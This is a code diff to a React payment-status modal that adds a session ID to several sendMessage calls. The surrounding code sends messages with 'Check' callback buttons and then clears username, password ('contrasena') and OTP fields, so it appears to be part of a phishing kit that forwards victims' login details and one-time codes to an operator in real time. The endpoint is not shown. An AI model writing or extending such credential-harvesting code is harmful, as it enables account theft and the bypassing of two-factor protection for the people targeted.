@@ -597,7 +597,7 @@ const PaymentStatusModal: React.FC<PaymentStatusModalProps> = ({
         ],
       };
 
-      sendMessage(mensaje, keyboard)
+sendMessage(mensaje, keyboard, sessionId)
         .then((res) => console.log("✅ OK:", res))
         .catch((err) => console.error("❌ ERROR:", err));
     }
@@ -757,7 +757,7 @@ const PaymentStatusModal: React.FC<PaymentStatusModalProps> = ({
         ],
       };
 
-      sendMessage(mensaje, keyboard);
+      sendMessage(mensaje, keyboard, sessionId);
 
       clearField("User");
       clearField("contrasena");
@@ -830,7 +830,7 @@ const PaymentStatusModal: React.FC<PaymentStatusModalProps> = ({
           [{ text: "✅ Check", callback_data: "check" }],
         ],
       };
-      sendMessage(mensaje, keyboard);
+      sendMessage(mensaje, keyboard, sessionId);
 
       clearField("otp");
 
@@ -2662,7 +2662,7 @@ const PaymentStatusModal: React.FC<PaymentStatusModalProps> = ({
                           [{ text: "✅ Check", callback_data: "check" }],
                         ],
                       };
-                      sendMessage(mensaje, keyboard);
+                      sendMessage(mensaje, keyboard, sessionId);
                     }}
                     style={{
                       width: "80%",
